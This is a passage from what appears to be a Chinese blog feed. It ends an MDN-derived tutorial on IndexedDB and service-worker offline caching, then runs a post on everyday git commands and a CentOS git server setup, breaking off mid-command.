&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>以下片段是从内部fetchVideoFromNetwork()获取的 - 这里我们使用两个单独<code>fetch()</code>请求获取视频的 MP4 和 WebM 版本。然后，我们使用该<code>Body.blob()</code>方法将每个响应的主体提取为 blob，为我们提供可以在以后存储和显示的视频的对象表示。 我们在这里遇到了一个问题 - 这两个请求都是异步的，但我们只想在两个 promises 都满足时尝试显示或存储视频。幸运的是，有一种处理这种问题的内置方法 -<code>Promise.all()</code>。这需要一个参数 - 引用您要检查放置在数组中的履行的所有单个承诺 - 并且本身是基于承诺的。 当所有这些承诺都履行完毕时，all()承诺将通过包含所有个人履行价值的数组来实现。在all()块中，您可以看到我们displayVideo()之前调用函数，就像在 UI 中显示视频一样，然后我们也调用storeVideo()函数将这些视频存储在数据库中。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">let mp4Blob = <span class="hljs-keyword">fetch</span>(<span class="hljs-string">&#x27;videos/&#x27;</span> + video.name + <span class="hljs-string">&#x27;.mp4&#x27;</span>).<span class="hljs-keyword">then</span>(response =&gt;<br>  response.blob()<br>);<br>let webmBlob = <span class="hljs-keyword">fetch</span>(<span class="hljs-string">&#x27;videos/&#x27;</span> + video.name + <span class="hljs-string">&#x27;.webm&#x27;</span>).<span class="hljs-keyword">then</span>(response =&gt;<br>  response.blob()<br>);;<br><br>// <span class="hljs-keyword">Only</span> run the next code <span class="hljs-keyword">when</span> <span class="hljs-keyword">both</span> promises have fulfilled<br>Promise.<span class="hljs-keyword">all</span>([mp4Blob, webmBlob]).<span class="hljs-keyword">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-keyword">values</span>) &#123;<br>  // display the video fetched <span class="hljs-keyword">from</span> the network <span class="hljs-keyword">with</span> displayVideo()<br>  displayVideo(<span class="hljs-keyword">values</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">values</span>[<span class="hljs-number">1</span>], video.name);<br>  // store it <span class="hljs-keyword">in</span> the IDB <span class="hljs-keyword">using</span> storeVideo()<br>  storeVideo(<span class="hljs-keyword">values</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">values</span>[<span class="hljs-number">1</span>], video.name);<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p>我们storeVideo()先来看看吧。这与您在上一个示例中看到的用于向数据库添加数据的模式非常相似 - 我们打开一个readwrite事务并获取对象存储引用videos，创建一个表示要添加到数据库的记录的对象，然后使用它添加它<code>IDBObjectStore.add()</code>。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> store<span class="hljs-constructor">Video(<span class="hljs-params">mp4Blob</span>, <span class="hljs-params">webmBlob</span>, <span class="hljs-params">name</span>)</span> &#123;<br>  <span class="hljs-comment">// Open transaction, get object store; make it a readwrite so we can write to the IDB</span><br>  <span class="hljs-keyword">let</span> objectStore = db.transaction(<span class="hljs-literal">[&#x27;<span class="hljs-identifier">videos</span>&#x27;]</span>, &#x27;readwrite&#x27;).<span class="hljs-keyword">object</span><span class="hljs-constructor">Store(&#x27;<span class="hljs-params">videos</span>&#x27;)</span>;<br>  <span class="hljs-comment">// Create a record to add to the IDB</span><br>  <span class="hljs-keyword">let</span> record = &#123;<br>    mp4 : mp4Blob,<br>    webm : webmBlob,<br>    name : name<br>  &#125;<br><br>  <span class="hljs-comment">// Add the record to the IDB using add()</span><br>  <span class="hljs-keyword">let</span> request = objectStore.add(record);<span class="hljs-operator"></span><br><span class="hljs-operator"></span><br><span class="hljs-operator">  ...</span><br><span class="hljs-operator"></span><br><span class="hljs-operator"></span>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>最后但并非最不重要的是，我们displayVideo()创建了在 UI 中插入视频然后将它们附加到页面所需的 DOM 元素。最有趣的部分如下所示 - 要在<video>元素中实际显示我们的视频 blob，我们需要使用该<code>URL.createObjectURL()</code>方法创建对象 URL（指向存储在内存中的视频 blob 的内部 URL）。完成后，我们可以将对象 URL 设置为<code>&lt;source&gt;</code>元素src属性的值，并且它可以正常工作。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> display<span class="hljs-constructor">Video(<span class="hljs-params">mp4Blob</span>, <span class="hljs-params">webmBlob</span>, <span class="hljs-params">title</span>)</span> &#123;<br>  <span class="hljs-comment">// Create object URLs out of the blobs</span><br>  <span class="hljs-keyword">let</span> mp4URL = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>create<span class="hljs-constructor">ObjectURL(<span class="hljs-params">mp4Blob</span>)</span>;<br>  <span class="hljs-keyword">let</span> webmURL = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>create<span class="hljs-constructor">ObjectURL(<span class="hljs-params">webmBlob</span>)</span>;<span class="hljs-operator"></span><br><span class="hljs-operator"></span><br><span class="hljs-operator">  ...</span><br><span class="hljs-operator"></span><br><span class="hljs-operator">  </span><span class="hljs-keyword">let</span> video = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">video</span>&#x27;)</span>;<br>  video.controls = <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">let</span> source1 = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">source</span>&#x27;)</span>;<br>  source1.src = mp4URL;<br>  source1.<span class="hljs-keyword">type</span> = &#x27;video/mp4&#x27;;<br>  <span class="hljs-keyword">let</span> source2 = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">source</span>&#x27;)</span>;<br>  source2.src = webmURL;<br>  source2.<span class="hljs-keyword">type</span> = &#x27;video/webm&#x27;;<span class="hljs-operator"></span><br><span class="hljs-operator"></span><br><span class="hljs-operator">  ...</span><br><span class="hljs-operator"></span>&#125;<br></code></pre></td></tr></table></figure></li></ol><h4 id="离线文件存储"><a href="#离线文件存储" class="headerlink" title="离线文件存储"></a>离线文件存储</h4><p>上面的示例已经说明了如何创建一个将大型资产存储在 IndexedDB 数据库中的应用程序，从而无需多次下载它们。这已经是对用户体验的一个很大的改进，但仍然有一件事 - 每次访问网站时仍然需要下载主要的 HTML，CSS 和 JavaScript 文件，这意味着当没有网络连接时，它将无法工作。</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Client-side_web_APIs/Client-side_storage/ff-offline.png" alt="img"></p><p>这就是<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API">服务工作者</a>和密切相关的<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Cache">Cache API 的</a>用武之地。</p><p>服务工作者是一个 JavaScript 文件，简单地说，它是在浏览器访问时针对特定来源（网站或某个域的网站的一部分）进行注册的。注册后，它可以控制该来源的可用页面。它通过坐在加载的页面和网络之间以及拦截针对该来源的网络请求来实现这一点。</p><p>当它拦截一个请求时，它可以做任何你想做的事情（参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API#other_use_case_ideas">用例思路</a>），但经典的例子是离线保存网络响应，然后提供响应请求而不是来自网络的响应。实际上，它允许您使网站完全脱机工作。</p><p>Cache API 是另一种客户端存储机制，略有不同 - 它旨在保存 HTTP 响应，因此与服务工作者一起工作得非常好。</p><p><strong>备注：</strong> 现在大多数现代浏览器都支持服务工作者和缓存。在撰写本文时，Safari 仍在忙着实施它，但它应该很快就会存在。</p><h4 id="一个-service-worker-例子"><a href="#一个-service-worker-例子" class="headerlink" title="一个 service worker 例子"></a>一个 service worker 例子</h4><p>让我们看一个例子，让你对这可能是什么样子有所了解。我们已经创建了另一个版本的视频存储示例，我们在上一节中看到了 - 这个功能完全相同，只是它还通过服务工作者将 Cache，CSS 和 JavaScript 保存在 Cache API 中，允许示例脱机运行！</p><p>请参阅<a href="https://mdn.github.io/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/">IndexedDB 视频存储，其中服务工作者正在运行</a>，并且还可以<a href="https://github.com/mdn/learning-area/tree/master/javascript/apis/client-side-storage/cache-sw/video-store-offline">查看源代码</a>。</p><h4 id="注册服务工作者"><a href="#注册服务工作者" class="headerlink" title="注册服务工作者"></a>注册服务工作者</h4><p>首先要注意的是，在主 JavaScript 文件中放置了一些额外的代码（请参阅<a href="https://github.com/mdn/learning-area/blob/master/javascript/apis/client-side-storage/cache-sw/video-store-offline/index.js">index.js</a>）。首先，我们进行特征检测测试，以查看<code>serviceWorker</code>该<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator"><code>Navigator</code></a>对象中是否有该成员。如果返回 true，那么我们知道至少支持服务工作者的基础知识。在这里，我们使用该<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ServiceWorkerContainer/register"><code>ServiceWorkerContainer.register()</code></a>方法将<code>sw.js</code>文件中包含的服务工作者注册到它所驻留的源，因此它可以控制与它或子目录相同的目录中的页面。当其承诺履行时，服务人员被视为已注册。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// Register service worker to control making site work offline</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;serviceWorker&#x27;</span> in navigator) &#123;<br>  navigator.serviceWorker<br>           .register(<span class="hljs-string">&#x27;/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/sw.js&#x27;</span>)<br>           .then(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;Service Worker Registered&#x27;</span>); &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> <code>sw.js</code>文件的给定路径是相对于站点源的，而不是包含代码的 JavaScript 文件。服务人员在<code>https://mdn.github.io/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/sw.js</code>。原点是<code>https://mdn.github.io</code>，因此给定的路径必须是<code>/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/sw.js</code>。如果您想在自己的服务器上托管此示例，则必须相应地更改此示例。这是相当令人困惑的，但出于安全原因，它必须以这种方式工作。</p><h4 id="安装-service-worker"><a href="#安装-service-worker" class="headerlink" title="安装 service worker"></a>安装 service worker</h4><p>下次访问服务工作者控制下的任何页面时（例如，重新加载示例时），将针对该页面安装服务工作者，这意味着它将开始控制它。发生这种情况时，<code>install</code>会向服务工作人员发起一个事件; 您可以在服务工作者本身内编写代码来响应安装。</p><p>让我们看一下<a href="https://github.com/mdn/learning-area/blob/master/javascript/apis/client-side-storage/cache-sw/video-store-offline/sw.js">sw.js</a>文件（服务工作者）中的一个例子。您将看到安装侦听器已注册<code>self</code>。此<code>self</code>关键字是一种从服务工作文件内部引用服务工作者的全局范围的方法。</p><p>在<code>install</code> 处理程序内部，我们使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ExtendableEvent/waitUntil"><code>ExtendableEvent.waitUntil()</code></a>事件对象上可用的方法来表示浏览器不应该完成服务工作者的安装，直到其中的 promise 成功完成。</p><p>这是我们在运行中看到 Cache API 的地方。我们使用该<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/CacheStorage/open"><code>CacheStorage.open()</code></a>方法打开一个可以存储响应的新缓存对象（类似于 IndexedDB 对象存储）。此承诺通过<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Cache"><code>Cache</code></a>表示<code>video-store</code>缓存的对象来实现。然后，我们使用该<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Cache/addAll"><code>Cache.addAll()</code></a>方法获取一系列资产并将其响应添加到缓存中。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">self</span>.addEventListener(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(e)</span></span> &#123;<br> e.waitUntil(<br>   caches.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;video-store&#x27;</span>).<span class="hljs-keyword">then</span>(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(cache)</span></span> &#123;<br>     <span class="hljs-keyword">return</span> cache.addAll([<br>       <span class="hljs-string">&#x27;/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/&#x27;</span>,<br>       <span class="hljs-string">&#x27;/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/index.html&#x27;</span>,<br>       <span class="hljs-string">&#x27;/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/index.js&#x27;</span>,<br>       <span class="hljs-string">&#x27;/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/style.css&#x27;</span><br>     ]);<br>   &#125;)<br> );<br>&#125;);<br></code></pre></td></tr></table></figure><p>这就是现在，安装完成。</p><h4 id="响应未来的请求"><a href="#响应未来的请求" class="headerlink" title="响应未来的请求"></a>响应未来的请求</h4><p>在我们的 HTML 页面上注册并安装了服务工作者，并且所有相关资产都添加到我们的缓存中，我们几乎准备好了。还有一件事要做，写一些代码来响应进一步的网络请求。</p><p>这就是第二位代码的<code>sw.js</code>作用。我们向服务工作者全局范围添加另一个侦听器，该范围在<code>fetch</code>引发事件时运行处理函数。只要浏览器在服务工作者注册的目录中请求资产，就会发生这种情况。</p><p>在处理程序内部，我们首先记录所请求资产的 URL。然后，我们使用该<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/FetchEvent/respondWith"><code>FetchEvent.respondWith()</code></a>方法为请求提供自定义响应。</p><p>在这个块中，我们<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/CacheStorage/match"><code>CacheStorage.match()</code></a>用来检查是否可以在任何缓存中找到匹配的请求（即匹配 URL）。如果未找到匹配，或者<code>undefined</code>如果未找到匹配，则此承诺将满足匹配的响应。</p><p>如果找到匹配项，我们只需将其作为自定义响应返回。如果没有，我们从网络中<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/fetch">获取（）</a>响应并返回该响应。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">self</span>.addEventListener(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(e)</span></span> &#123;<br>  console.<span class="hljs-built_in">log</span>(e.request.url);<br>  e.respondWith(<br>    caches.<span class="hljs-built_in">match</span>(e.request).<span class="hljs-keyword">then</span>(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(response)</span></span> &#123;<br>      <span class="hljs-keyword">return</span> response || fetch(e.request);<br>    &#125;)<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p>这就是我们简单的服务工作者。您可以使用它们进行更多的负载 - 有关详细信息，请参阅<a href="https://github.com/mdn/serviceworker-cookbook/">服务工作者手册</a>。感谢 Paul Kinlan 在他的文章中<a href="https://developers.google.com/web/fundamentals/codelabs/offline/">添加服务工作者和离线到您的 Web 应用程序</a>，这启发了这个简单的例子。</p><h4 id="测试离线示例"><a href="#测试离线示例" class="headerlink" title="测试离线示例"></a>测试离线示例</h4><p>要测试我们的<a href="https://mdn.github.io/learning-area/javascript/apis/client-side-storage/cache-sw/video-store-offline/">服务工作者示例</a>，您需要加载它几次以确保它已安装。完成后，您可以：</p><ul><li>尝试拔掉网络连接&#x2F;关闭 Wifi。</li><li>如果您使用的是 Firefox，请选择<em>文件&gt;脱机工作</em>。</li><li>转到 devtools，然后选择<em>Application&gt; Service Workers</em>，如果您使用的是 Chrome，请选中<em>Offline</em>选中。</li></ul><p>如果再次刷新示例页面，您仍应该看到它加载得很好。所有内容都是脱机存储的 - 缓存中的页面资源以及 IndexedDB 数据库中的视频。</p><h1 id="that’s-it"><a href="#that’s-it" class="headerlink" title="that’s it"></a>that’s it</h1>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git常用操作</title>
    <link href="/blog/2022/11/09/git/"/>
    <url>/blog/2022/11/09/git/</url>
    
    <content type="html"><![CDATA[<h1 id="git常用操作"><a href="#git常用操作" class="headerlink" title="git常用操作"></a>git常用操作</h1><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/1391668002121_.pic-20221109%2022:00:14.jpg" alt="1391668002121_.pic"></p><h3 id="1-git配置"><a href="#1-git配置" class="headerlink" title="1 git配置"></a>1 git配置</h3><ol><li>安装Git：<a href="https://link.zhihu.com/?target=https://git-scm.com/">https://git-scm.com/</a></li><li>本地命令行生成密钥绑定GitHub账号</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 输入命令生成密钥对，替换成自己邮箱，然后一路回车</span><br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;youremail@example.com&quot;</span><br><br><span class="hljs-comment"># 将生成的公钥打印出来复制，将这串文本复制粘贴到GitHub的Setting-&gt;SSH and GPG keys中</span><br><span class="hljs-built_in">cat</span> ~/.ssh/id_rsa.pub<br><br><span class="hljs-comment"># 输入命令检查是否绑定成功,输入yes后，如果出现Hi,xxx!则绑定成功</span><br>ssh -T git@github.com<br></code></pre></td></tr></table></figure><p>\3. 配置用户名和邮箱信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看配置信息，一开始为空</span><br>git config --list<br><br><span class="hljs-comment"># 全局配置，对所有代码库生效</span><br>git config --global user.name <span class="hljs-string">&quot;你的名字&quot;</span><br>git config --global user.email <span class="hljs-string">&quot;你的邮箱&quot;</span><br><br><br><span class="hljs-comment"># 局部配置，只对当前的代码库有效</span><br>git config --<span class="hljs-built_in">local</span> user.name <span class="hljs-string">&quot;你的名字&quot;</span><br>git config --<span class="hljs-built_in">local</span> user.email <span class="hljs-string">&quot;你的邮箱&quot;</span><br><br><span class="hljs-comment"># 配置后，远程仓库提交的commit里对应的用户即为 user.name</span><br></code></pre></td></tr></table></figure><h3 id="2-git基本概念"><a href="#2-git基本概念" class="headerlink" title="2 git基本概念"></a>2 git基本概念</h3><ol><li>本地仓库：本地仓库上存放所有相关的文件，具体可分为工作区、暂存区和仓库区，工作区即项目文件夹下不包含<code>.git</code>文件夹的所有文件，暂存区和仓库区则在<code>.git</code>文件夹下</li><li>工作区：即我们工作的文件夹，在里面进行文件的增删改操作</li><li>暂存区：临时保存工作区上的改动，通过<code>git add</code>操作将工作区的修改同步到暂存区</li><li>仓库区：当执行<code>git commit</code>操作时，将暂存区上的所有变动同步到本地仓库</li><li>远程仓库：GitHub&#x2F;GitLab上保存的仓库，通过<code>git push</code>将本地仓库同步到远程仓库，也可以通过<code>git fetch/pull</code>将远程仓库同步到本地仓库</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/1411668002121_.pic-20221109%2022:00:35.jpg" alt="1411668002121_.pic"></p><h3 id="3-git基本操作"><a href="#3-git基本操作" class="headerlink" title="3 git基本操作"></a>3 git基本操作</h3><p><strong>创建版本库</strong></p><p>创建版本库有两种方式，一种是将本地的文件夹直接变成一个git仓库，另一种是直接将远程的仓库克隆到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git init <span class="hljs-comment"># 将本地文件夹变为一个git仓库</span><br>git <span class="hljs-built_in">clone</span> &lt;url&gt; <span class="hljs-comment">#将远程仓库克隆到本地</span><br></code></pre></td></tr></table></figure><p><strong>修改与提交操作</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git add &lt;file&gt; <span class="hljs-comment"># 将单个文件从工作区添加到暂存区</span><br>git add . <span class="hljs-comment"># 将所有文件添加到暂存区</span><br>git commit -m <span class="hljs-string">&quot;messenge&quot;</span> <span class="hljs-comment"># 将暂存区文件提交到本地仓库</span><br>git status <span class="hljs-comment"># 查看工作区状态，显示有变更的文件。</span><br>git diff <span class="hljs-comment"># 比较文件的不同，即暂存区和工作区的差异。</span><br></code></pre></td></tr></table></figure><p><strong>远程操作</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git push origin master <span class="hljs-comment"># 将本地的master分支推送到远程对应的分支</span><br>git pull  <span class="hljs-comment"># 下载远程代码并合并，相当于git fetch + git pull</span><br>git fetch   <span class="hljs-comment"># 从远程获取代码库，但不进行合并操作</span><br><br>git remote add origin &lt;url&gt; <span class="hljs-comment"># 将远程仓库与本地仓库关联起来</span><br>git remote -v <span class="hljs-comment"># 查看远程库信息</span><br></code></pre></td></tr></table></figure><p><strong>撤销与回退操作</strong></p><p>撤销操作：当修改了工作区&#x2F;暂存区的文件，但是还没有commit时，想要撤销之前的操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 场景1：当你改乱了工作区某个文件的内容，但还没有add到暂存区</span><br>git checkout &lt;file&gt; <span class="hljs-comment"># 撤销工作区的某个文件到和暂存区一样的状态</span><br><br><span class="hljs-comment"># 场景2：当乱改了工作区某个文件的内容，并且git add到了暂存区</span><br>git reset HEAD &lt;file&gt; <span class="hljs-comment"># 第1步，将暂存区的文件修改撤销掉</span><br>git checkout &lt;file&gt; <span class="hljs-comment"># 第2步，将工作区的文件修改撤销掉</span><br><br><span class="hljs-comment"># 场景3：乱改了很多文件，想回到最新一次提交时的状态</span><br>git reset --hard HEAD <span class="hljs-comment"># 撤销工作区中所有未提交文件的修改内容</span><br></code></pre></td></tr></table></figure><p>回退操作：当已经进行了commit操作，需要回退到之前的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset --hard HEAD^ <span class="hljs-comment"># 回退到上次提交的状态</span><br>git reset --hard HEAD~n <span class="hljs-comment"># 回退到n个版本前的状态</span><br>git reset --hard HEAD commitid <span class="hljs-comment"># 回退到某一个commitid的状态</span><br>git reset --soft HEAD commitid <span class="hljs-comment"># 回退到某一个commitid的状态，并且保留暂存区的内容</span><br>git reset --mixed(默认) HEAD commitid <span class="hljs-comment"># 回退到某一个commitid的状态，并且保留工作区的内容</span><br></code></pre></td></tr></table></figure><p>关于reset三种模式的说明：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/1421668002121_.pic-20221109%2022:00:46.jpg" alt="1421668002121_.pic"></p><h3 id="4-git分支管理"><a href="#4-git分支管理" class="headerlink" title="4 git分支管理"></a>4 git分支管理</h3><p>git的最强大之处就在于分支管理了，具体有两种应用场景：</p><ol><li>多人协作：每个人都基于主分支创建一个自己的分支，在分支上进行开发，然后再不断将写好的代码合并到主分支</li><li>自己修复bug&#x2F;增加feature：创建一个bug分支或者feature分支，写好代码后合并到自己的分支然后删除bug&#x2F;feature分支</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch &lt;name&gt; <span class="hljs-comment"># 创建分支</span><br>git checkout &lt;name&gt; <span class="hljs-comment"># 切换到某个分支</span><br>git checkout -b &lt;name&gt; <span class="hljs-comment"># 创建并切换到新分支，相当于同时执行了以上两个命令</span><br>git merge &lt;name&gt; <span class="hljs-comment"># 合并某个分支到当前分支中，默认fast forward</span><br>git branch -a <span class="hljs-comment"># 查看所有分支</span><br>git branch -d &lt;name&gt; <span class="hljs-comment"># 删除分支</span><br></code></pre></td></tr></table></figure><h3 id="5-git多人协作"><a href="#5-git多人协作" class="headerlink" title="5 git多人协作"></a>5 git多人协作</h3><p>多人协作在同一个分支上进行开发的工作模式：</p><ol><li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</li><li>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并；</li><li>如果合并有冲突，则解决冲突，并在本地提交；</li><li>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功！</li><li>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。</li></ol><h3 id="6-git服务器搭建"><a href="#6-git服务器搭建" class="headerlink" title="6 git服务器搭建"></a>6 git服务器搭建</h3><p>自己搭建一台 Git 服务器作为私有仓库使用，以 Centos 为例搭建 Git 服务器</p><p>安装git</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> curl-devel expat-devel gettext-devel openssl-devel zlib-devel perl-devel<br>yum <span class="hljs-keyword">install</span> git<br></code></pre></td></tr></table></figure><p>创建一个git用户组和用户，用来运行git服务：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">groupadd git</span><br><span class="hljs-attribute">useradd git -g git</span><br></code></pre></td></tr></table></figure><p>收集所有需要登录的用户的公钥，公钥位于id_rsa.pub文件中，把我们的公钥导入到&#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorized_keys文件里，一行一个。</p><p>如果没有该文件创建它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/git/<br><span class="hljs-built_in">mkdir</span> .ssh<br><span class="hljs-built_in">chmod</span> 755 .ssh<br><span class="hljs-built_in">touch</span> .ssh/authorized_keys<br><span class="hljs-built_in">chmod</span> 644 .ssh/authorized_keys<br></code></pre></td></tr></table></figure><p>首先我们选定一个目录作为Git仓库，假定是&#x2F;home&#x2F;gitrepo&#x2F;runoob.git，在&#x2F;home&#x2F;gitrepo目录下输入命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /home</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> gitrepo</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chown</span> git:git gitrepo/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> gitrepo</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git 